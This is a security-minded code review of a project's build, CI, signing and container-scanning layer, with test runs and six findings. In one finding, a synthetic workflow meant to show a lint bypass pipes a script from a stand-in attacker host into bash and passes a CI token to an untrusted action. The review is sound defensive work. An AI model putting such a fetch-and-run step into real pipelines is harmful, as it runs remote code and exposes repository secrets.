# Dimension G — build and pipeline layer

Review of `da3f45c..HEAD` over the 1,165 lines of shell, `justfile`, CI configuration,
`Containerfile`/`container/manifest.py` changes and `docs/cve-baseline.json`. No prior
review has read this surface.

Every finding here is **post-merge by construction**. Nothing below argues for blocking
the merge; each entry is written to be filed as an issue as-is.

Verdict in one line: the layer is well built and the parts that carry the strongest
claims (`verify-provider.sh`, `sign.sh`, the `manifest.py` SHA guard's regex, the
`VCOWS_GATES` mechanism) hold up under test. The six findings are all cases where a
stated guarantee is narrower than the comment above it says.

---

## What I verified as working (no finding)

These were the explicit asks. I tested them rather than reading them, and they pass.

### `verify-provider.sh` really does compare all four places

Run live at HEAD:

```
provider version per main.tf: 0.9.8
  ok    Containerfile PROVIDER_VERSION
  ok    lock file version
  ok    mirrored zip sha256 vs Containerfile
  ok    mirror index h1: vs committed lock
  ok    mirror index zh: vs Containerfile
  ok    mirror holds exactly one provider zip
all provider facts agree
```

Tracing the data: `docs/provider-0.9.8.lock.hcl` carries exactly one hash,
`h1:yqZeKoJ+EZc3687/+ZBqBmtwzvBPLNwaEHW74+bSc6Y=`. The mirror index
`.tools/tofu-mirror/registry.opentofu.org/dmacvicar/libvirt/0.9.8.json` carries that
same `h1:` plus `zh:061e5187...`, and `061e5187...` is the `ARG PROVIDER_SHA256` in
the Containerfile and the real `sha256sum` of the mirrored zip. Every edge in the
four-way claim at `scripts/verify-provider.sh:12-16` is an actual comparison. The
one soft spot is documented in the script itself: with no mirror present, `cf_sha`
and `lock_h1` are computed and never compared, and the script exits 0 after printing
`skip  mirror checks`. Both CI pipelines run `just ensure-mirror` before
`just verify-provider`, so the skip path is not reachable in CI.

### `sign.sh --verify` works with no network, and rejects a tampered blob

Reproduced the exact flag set from `scripts/sign.sh:38-39` and `:52-59` against
cosign 3.x in this environment:

```
$ cosign signing-config create --fulcio=url=https://unused.invalid,... --out signing-config.json   -> ok
$ COSIGN_PASSWORD="" cosign sign-blob --key cosign.key --signing-config signing-config.json \
      --yes --bundle blob.tar.bundle blob.tar                                                     -> ok
$ cosign verify-blob --key cosign.pub --bundle blob.tar.bundle --insecure-ignore-tlog blob.tar
  Verified OK                                                                        rc=0
$ unshare -rn cosign verify-blob --key cosign.pub --bundle blob.tar.bundle --insecure-ignore-tlog blob.tar
  Verified OK                                                                        rc=0
$ echo tampered > blob.tar && cosign verify-blob ... 
  Error: failed to verify signature: ... invalid signature                           rc=1
```

The air-gap claim at `scripts/sign.sh:7-14` is accurate, including the `signing-config`
workaround for cosign 3 refusing `--tlog-upload=false` against its default config. The
sign path does not self-verify after signing, but `just verify-signature` exists and
does the real thing, so I am not filing that.

### The `git_sha` regex guard is correct

`container/manifest.py:33` — `re.compile(r"[0-9a-f]{40}(-dirty)?\Z")` used with
`.match()`. Anchored both ends; `<40hex>` and `<40hex>-dirty` pass, everything else
becomes `unknown`. The guard is sound. What feeds it is not — see RW-G3.

### The `VCOWS_GATES` mechanism does turn skips into failures

`tests/conftest.py:44-75`. `gate()` returns `pytest.mark.gate_missing(reason)` when a
gate is demanded and unavailable, and `pytest_runtest_setup` converts that mark into
`pytest.fail(..., pytrace=False)`. `require()` covers fixture bodies and module
imports. `tests/test_gates.py` asserts that no bare `pytest.skip`/`skipif` bypasses
this. `just test-tofu` sets `VCOWS_GATES=tofu`, `scripts/test-image.sh:16` sets
`VCOWS_GATES=image`. A silently-skipped tofu or image gate cannot reach green in the
`tofu` or `image` jobs. This is the strongest part of the layer.

### Shell safety

`set -euo pipefail` and `IFS=$'\n\t'` come from `scripts/lib.sh:16-17` and every script
sources it. `shellcheck -x -s bash scripts/*.sh` is clean; so is `-o all` apart from
`SC2250`/`SC2292`/`SC2310`/`SC2312` style and info notes. Every `rm -rf` on a
variable-built path is guarded: `install-tools.sh:100,107` use `"${TOOLS_BIN:?}/$tool"`,
`mirror.sh:78` and `install-tools.sh:135` operate on paths derived from `REPO`, which is
`readonly` and computed from `BASH_SOURCE`. `mktemp -d` + `trap ... EXIT` in both
`install-tools.sh:135` and `mirror.sh:60`. I found nothing destructive.

One real `set -e` hole exists in this area — see RW-G5 — but it is a reporting hole,
not a destructive one.

---

## Findings

### RW-G1 — medium — the image workflow's path filter omits the image gate's own machinery and the CVE baseline

`.github/workflows/image.yml:21-28`, mirrored at `.gitlab-ci.yml:95-102`.

The filter is:

```yaml
  pull_request:
    paths:
      - 'Containerfile'
      - '.containerignore'
      - 'container/**'
      - 'orchestrator/backends/libvirt/tofu/**'
      - 'docs/provider-*.lock.hcl'
      - 'licenses/**'
      - 'scripts/image-*.sh'
```

Not listed, and each one materially determines what the image job does or asserts:

| path | what it controls |
| --- | --- |
| `docs/cve-baseline.json` | which CVEs `just scan` accepts |
| `tests/test_image.py` | the entire image gate — every assertion the job makes |
| `scripts/lib.sh` | `image_tag()` and `containerfile_arg()`, i.e. *which image* is built, tested and scanned |
| `scripts/test-image.sh` | how the gate is invoked |
| `scripts/mirror.sh`, `scripts/verify-provider.sh` | the mirror the image bakes in |
| `scripts/sign.sh` | signing |
| `justfile` | every recipe the job runs |

`scripts/image-*.sh` matches `image-build.sh` and `image-scan.sh` and nothing else.

The sharpest case is `docs/cve-baseline.json`. `scripts/image-scan.sh` is the only
consumer of that file, and adding an id to `.accepted` mutes a CVE. A PR whose only
change is adding ids to that array does not trigger `image.yml` at all, so the scan
never runs on the change that widens what the scan accepts. `ci.yml` has no path
filter and its `check`/`tofu` jobs go green, so the PR is green.

The second-sharpest is `tests/test_image.py`. A PR that deletes assertions from the
image gate does not run the image gate.

This interacts badly with a second property of the design. `just scan` is blocking in
the PR `image` job, and it fails on any CVE id not already in the baseline. Rocky and
the Go module database publish new ids continuously and independently of this repo, so
the job goes red on PRs that changed nothing relevant, and the only PR-side remedy is
to append to `docs/cve-baseline.json` — an edit that, per the above, is itself
unscanned. `scripts/image-scan.sh:7-13` names "an always-red gate gets muted within a
month" as the failure it is avoiding; the differential design avoids the always-red
half but leaves the mute button ungated.

**Suggested fix:** add `docs/cve-baseline.json`, `tests/test_image.py`, `justfile`,
and widen `scripts/image-*.sh` to `scripts/*.sh`, in both files.

---

### RW-G2 — medium — `image-scan.sh` cannot distinguish "no new CVEs" from "trivy found nothing at all"

`scripts/image-scan.sh:65` and `:83-91`.

```sh
found="$(jq -r '[.Results[]?.Vulnerabilities[]?.VulnerabilityID] | unique | .[]' "$report")"
...
new="$(comm -13 <(jq -r '.accepted[]' "$BASELINE" | sort) <(printf '%s\n' "$found" | sort))"
if [ -n "$new" ]; then ... die ...; fi
log "no findings outside the baseline"
```

The gate is purely one-directional: it asserts that `found ⊆ accepted`. It never
asserts that anything was found. The baseline records 99 ids known to be in this image,
and the empty set is a subset of them, so a scan that analysed nothing is green.

Reproduced with the exact pipeline against the real baseline:

```
$ echo '{"Results":[]}' > trivy-empty.json          # or {"Results":null}
$ found="$(jq -r '[.Results[]?.Vulnerabilities[]?.VulnerabilityID] | unique | .[]' trivy-empty.json)"
$ new="$(comm -13 <(jq -r '.accepted[]' docs/cve-baseline.json | sort) <(printf '%s\n' "$found" | sort))"
$ [ -n "$new" ] && echo FAILS || echo "GATE PASSES GREEN with zero findings"
GATE PASSES GREEN with zero findings
```

Three realistic ways to land there, all with `trivy` exiting 0:

1. A base-image change to something trivy cannot fingerprint. Trivy emits
   `"Results": null` and exits 0; the `?` operators turn that into an empty list.
2. A trivy JSON schema change across a version bump. The `?` in `.Results[]?`
   specifically suppresses the "cannot iterate" error that would otherwise surface it:

   ```
   $ echo '{"SchemaVersion":3,"Findings":[{"Vulnerabilities":[{"VulnerabilityID":"CVE-9999-0001"}]}]}' \
       | jq -r '[.Results[]?.Vulnerabilities[]?.VulnerabilityID] | unique | .[]'
   (no output, rc=0)
   ```

   `scripts/install-tools.sh:28` pins `TRIVY_VERSION=0.74.0`, so this needs a
   deliberate bump — but a bump is what dependabot and a maintainer do, and the
   failure is silent green.
3. A `--input` archive trivy opens but does not fully walk.

**Suggested fix:** before the `comm`, assert a floor — e.g. that the ids trivy found
cover the baseline's `rocky-base` group, or simply that `found` is non-empty and at
least N ids matched. A one-line `[ "$(printf '%s' "$found" | grep -c .)" -ge 50 ] ||
die "scan produced implausibly few findings"` converts all three cases into red.
Related: `.Results[].Secrets` and `.Results[].Misconfigurations` are never read, so
trivy's secret scanner contributes nothing to the gate.

---

### RW-G3 — medium — a modified `Containerfile` still records a clean git SHA in the manifest

`scripts/image-build.sh:39-45`.

```sh
ship=(orchestrator container licenses "docs/provider-${provider}.lock.hcl")
sha="$(git -C "$REPO" rev-parse HEAD)"
dirty=""
if [ -n "$(git -C "$REPO" status --porcelain -- "${ship[@]}")" ]; then
    dirty="-dirty"
```

`ship` is the set of paths the Containerfile `COPY`s. It is complete for those — I
checked all seven `COPY` lines against it. But the Containerfile itself is not in the
set, and it decides the base image and digest (`:44-45`), the OpenTofu version and RPM
digest (`:61-62`), the provider version and digest (`:68-69`), the entire `dnf install`
list (`:83-93`), `ENV`, `ENTRYPOINT`, `WORKDIR` and every OCI label. `.containerignore`
is likewise absent, and it decides the build context.

Reproduced against a clone of HEAD:

```
$ sed -i 's/^ARG BASE_DIGEST=.*/ARG BASE_DIGEST=sha256:deadbeef/' Containerfile
$ echo 'ARG TOFU_VERSION_TEST=x' >> Containerfile
$ git status --porcelain -- orchestrator container licenses docs/provider-0.9.8.lock.hcl
(empty)
$ git status --porcelain
 M Containerfile
```

So `just image` on that tree passes `--build-arg GIT_SHA=<clean 40 hex>`,
`container/manifest.py:78` accepts it as shape-valid, and `/opt/vcows/manifest.json`
plus `org.opencontainers.image.revision` name a commit that does not build this image.
That is the e5d5a2c failure restated at `scripts/image-build.sh:6-10` and
`Containerfile:20-27`, one file over.

The comment's justification — "a change under `docs/` or `tests/` cannot reach the
image, and flagging the build for one would make the suffix mean nothing" — is right
about `docs/` and `tests/`. It does not extend to the Containerfile, which is the most
load-carrying build input there is.

**Suggested fix:** `ship=(Containerfile .containerignore orchestrator container
licenses "docs/provider-${provider}.lock.hcl")`, and update the `ship=` line in the
Containerfile's own build recipe at `Containerfile:14` to match.

---

### RW-G4 — low — the "workflows carry no logic" assertion has three bypasses

`scripts/lint.sh:34-77`. The assertion is the only thing keeping the claim at
`justfile:3-6`, `ci.yml:1-4` and `.gitlab-ci.yml:6-8` true. It is real — it parses YAML
rather than grepping, and it does recurse into GitLab's list-valued `script:` — but it
checks less than the claim.

I ran the embedded Python verbatim against a synthetic workflow directory:

```yaml
# .github/workflows/evil.yml
jobs:
  a:
    steps:
      - uses: some/untrusted-action@main
        with: {token: "${{ secrets.GITHUB_TOKEN }}"}
      - run: just check || true
      - run: just test && curl -s https://evil.example/x.sh | bash
      - run: ./scripts/install-tools.sh; rm -rf /tmp/whatever
# .github/workflows/other.yaml
jobs: {c: {steps: [{run: "echo totally arbitrary logic"}]}}
```

Result: `BAD: NONE -- assertion passed`.

Three separate holes:

1. **`:62`** — `glob("*.yml")`. `.yaml` is equally valid for GitHub workflows and is
   not scanned at all.
2. **`:45-57`** — `commands()` only yields `run`/`script`/`before_script`/`after_script`.
   `uses:` is never examined, so a third-party action running arbitrary code with the
   job's token satisfies the assertion. The current workflows use only
   `actions/checkout@v4` and `actions/cache@v4`, and `ci.yml:7-9` explicitly claims "No
   third-party actions" — nothing enforces that claim.
3. **`:70`** — `command.startswith(ok)`. `splitlines()` catches a second command on a
   second line, but `&&`, `||`, `;` and `|` on the same line all pass because the line
   still starts with `just `.

**Suggested fix:** glob `*.yml` and `*.yaml`; add `uses` to the key set and allowlist
`actions/checkout@`/`actions/cache@` explicitly; and split each command on `;&|` before
the `startswith` test rather than testing the whole line.

Nothing in the tree violates the assertion today. This is filed because the assertion
is the mechanism the GitLab-migration claim rests on, and its coverage should be known.

---

### RW-G5 — low — `image_tag()` swallows `containerfile_arg`'s `die` and returns an empty tag

`scripts/lib.sh:58-60`.

```sh
image_tag() {
    printf '%s\n' "${VCOWS_IMAGE_TAG:-localhost/vcows-deploy:$(containerfile_arg VCOWS_VERSION)}"
}
```

`containerfile_arg` is explicitly designed to fail loudly — `scripts/lib.sh:45-48`
says so, and `:52` is `[ -n "$value" ] || die ...`. But `die`'s `exit 1` runs inside a
command substitution, which exits only that subshell. The substitution is an *argument*
to `printf`, so the enclosing command's status is `printf`'s, which is 0. `set -e` never
fires.

Reproduced with the function bodies verbatim and a `$REPO` with no Containerfile:

```
error: no 'ARG VCOWS_VERSION=' in Containerfile
SURVIVED. tag=[localhost/vcows-deploy:]
exit=0
```

Consumers: `scripts/image-build.sh:24`, `scripts/image-scan.sh:52`,
`scripts/test-image.sh:14`. Each proceeds with a malformed tag and fails later
somewhere less legible — `test-image.sh` exports `VCOWS_IMAGE=localhost/vcows-deploy:`,
which satisfies `tests/test_image.py:45`'s `IMAGE is not None` predicate, so the image
gate reports itself *available* and then fails inside podman rather than at the gate.
The `error:` line does reach stderr, so this is loud-ish, not silent. Low.

Same shape, same file: `image_tag()` is also the only caller in the chain, so the fix
is local.

**Suggested fix:**

```sh
image_tag() {
    local v
    [ -n "${VCOWS_IMAGE_TAG:-}" ] && { printf '%s\n' "$VCOWS_IMAGE_TAG"; return; }
    v="$(containerfile_arg VCOWS_VERSION)"
    printf '%s\n' "localhost/vcows-deploy:$v"
}
```

The separate assignment statement is what makes `set -e` fire.

---

### RW-G6 — low — a system copy of a tool beats the pin, at any version, unreported

`scripts/install-tools.sh:88-93`.

```sh
    # A system copy is fine and is what the maintainer's Rocky box has for
    # `just` (EPEL) and `tofu`. Only install what is genuinely missing.
    if have "$tool" && [ "${FORCE:-0}" != 1 ]; then
        log "  $tool: using $(command -v "$tool")"
        return
    fi
```

`have` is `command -v`, which says nothing about version. The branch applies to all
seven tools, not just the two the comment names. So on any machine with a distro
`tofu`, `just`, `hadolint`, `trivy`, `syft` or `cosign`, the pinned version and its
digest at `:25-44` are advisory, and the log line prints the *path* but not the
*version* — so the deviation is not visible in the output either.

For `tofu` specifically this contradicts the contract stated at `scripts/lib.sh:5-9`:
"Versions are read out of the Containerfile, never redeclared... a script that repeated
`1.12.6` would let CI test a different OpenTofu than the one that ships, silently."
Reading the version from the Containerfile removes one way to get that outcome;
`:90` reintroduces it. On this box the two happen to agree (`OpenTofu v1.12.6`, pin
`1.12.6`), so nothing is wrong today.

For `trivy` this compounds RW-G2: a distro trivy old enough to have a different JSON
schema, or new enough, is silently substituted.

The hosted CI runners have none of these preinstalled, so CI is unaffected. The
exposure is developer boxes and any self-hosted GitLab runner image.

**Suggested fix:** compare versions, not presence — for `tofu` at minimum, since the
Containerfile owns that pin. Or drop the branch and rely on `installed()` at `:84`,
which is already the `.tools/bin` fast path, and let `FORCE=1` be the escape hatch.

---

## Things I looked at and deliberately did not file

- **`.gitlab-ci.yml:22-24` sets `image: ubuntu:24.04` as a `default:`, and the `image`
  and `rebuild-scan` jobs override only `tags: [podman]`.** Whether the container image
  applies depends on the executor: a shell executor ignores `image:`, a docker executor
  would put podman inside a container. The file is documented as never executed
  (`.gitlab-ci.yml:3`), and I cannot determine the executor. Worth a look at migration
  time; not a defect I can anchor.
- **`.gitlab-ci.yml` `check` and `tofu` carry no `rules:`, so they also run on the
  monthly schedule pipeline.** Noise, not a defect.
- **`install-tools.sh` hardcodes x86_64/amd64 in every `url()` arm.** On arm64 the
  digests match, the binaries install, and `just` fails with an exec-format error. Loud;
  not silent.
- **`sign.sh` regenerates a key pair whenever `.cache/cosign.key` is absent**, silently
  invalidating any previously distributed public key. `scripts/sign.sh:45` says so in
  the log line. Documented, and `.cache/` is gitignored by design.
- **`scripts/image-scan.sh --write-baseline` accepts everything currently found with no
  review.** That is what it is for, no pipeline calls it, and the review requirement is
  a human one. The gap that matters is that its *output* is unscanned — that is RW-G1.
- **`docs/cve-baseline.json` matches on `VulnerabilityID` alone**, so an id accepted for
  one package is accepted for every package in the image. In principle a CVE accepted on
  reachability grounds for the provider's `x/crypto` would be muted if it later appeared
  in a fixable Rocky RPM. I could not construct a concrete instance from the current 99
  ids, so this is context for RW-G1/RW-G2 rather than its own finding. The `rationale`
  block is genuinely a reasoned acceptance, not a mute button: five groups, each with a
  `why`, a `recheck` trigger and sources, and the fd5acb9 commit message corrects a
  wrong claim from the earlier survey with measured evidence. It is the best-documented
  file in this layer.
